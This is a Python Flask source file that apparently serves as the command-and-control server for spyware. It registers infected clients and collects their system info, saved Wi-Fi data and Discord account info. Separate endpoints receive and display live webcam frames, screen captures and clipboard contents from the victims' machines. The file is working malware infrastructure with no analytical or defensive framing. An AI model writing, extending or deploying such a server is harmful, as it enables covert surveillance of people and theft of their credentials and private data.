from flask import Flask, request, Response, render_template
import cv2
import numpy as np
from random import randint
import base64

app = Flask(__name__)
last_frame = {}
screen_last_frame = {}

clients = {}

@app.route('/', methods=['GET'])
def mainSite():
    return render_template('main.html', client = clients, Maxclients = len(clients))

@app.route('/client/<int:clientId>', methods=['GET'])
def client1(clientId):
    systemInfo = clients[clientId]["systemInfo"]
    wifis = clients[clientId]["wifis"]
    discordinfo = clients[clientId]["discordInfo"]
    return render_template(f'client.html', clientId = clientId, systeminfo=systemInfo, Wifis=wifis, Discordinfo=discordinfo)

@app.route('/client', methods=['GET', 'POST'])
def regclient():
    global clients
    clientId = 0

    if request.method == 'POST':
        if not request.remote_addr in clients:
            clientId = randint(1000,9999)
            json = request.json
            clients[clientId] = {"systemInfo": json['osInfo'],"clientClipboard": "", "wifis": json['wifis'], "discordInfo": json['discordInfo']}
            print(clients[clientId])
        else:
            print(f"{request.remote_addr} arleady in clients!")

        return Response(str(clientId))

    if request.method == 'GET':
        return f"There are {len(clients)} clients online"

@app.route("/debug", methods=['GET'])
def debugpage():
    return f"Client: {clients}"

@app.route('/send_camera', methods=['GET', 'POST'])
def send_camera():
    global last_frame
    if request.method == 'POST':
        frame_data = request.data
        frame = cv2.imdecode(np.frombuffer(frame_data, np.uint8), cv2.IMREAD_COLOR)
        if frame is not None:
            last_frame[request.args.get('id')] = frame

        return Response(status=200)

@app.route('/get_camera_frame', methods=['GET'])
def get_camera_frame():
    global last_frame
    try:
        if last_frame[request.args.get('id')] is not None:
            _, encoded_frame = cv2.imencode('.jpg', last_frame[request.args.get('id')])
            response = Response(encoded_frame.tobytes(), mimetype='image/jpeg')
            response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
            return response
    except:
        pass


    return "No frame available"

@app.route('/send_screen', methods=['POST'])
def send_screen():
    global screen_last_frame
    if request.method == 'POST':
        frame_data = request.data
        frame = cv2.imdecode(np.frombuffer(frame_data, np.uint8), cv2.IMREAD_COLOR)

        if frame is not None:
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            screen_last_frame[request.args.get('id')] = frame_rgb

    return Response(status=200)

@app.route('/get_screen_frame', methods=['GET'])
def get_screen_frame():
    global screen_last_frame
    try:
        if screen_last_frame[request.args.get('id')] is not None:
            _, encoded_frame = cv2.imencode('.jpg', screen_last_frame[request.args.get('id')])
            response = Response(encoded_frame.tobytes(), mimetype='image/jpeg')
            response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
            return response
    except:
        pass

    return "No frame available"

@app.route('/send_clipboard', methods=['POST'])
def send_console():
    clientId = request.args.get('id')
    message = request.json['text']
    if isinstance(clientId, str):
        if int(clientId) in clients:
            clipboard = clients[int(clientId)]['clientClipboard']
            clients[int(clientId)]['clientClipboard'] = clipboard + message
            return "Message sent to client clipboard successfully"
        else:
            return f"id {clientId} not in clients!"
    else:
        return "Client id is not correct"

@app.route('/get_clipboard', methods=['GET'])
def get_console():
    clientId = request.args.get('id')
    if isinstance(clientId, str):
        if int(clientId) in clients:
            console = clients[int(clientId)]['clientClipboard']
            return console
        else:
            return f"id {clientId} not in clients!"
    else:
        return "Client id is not correct"


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)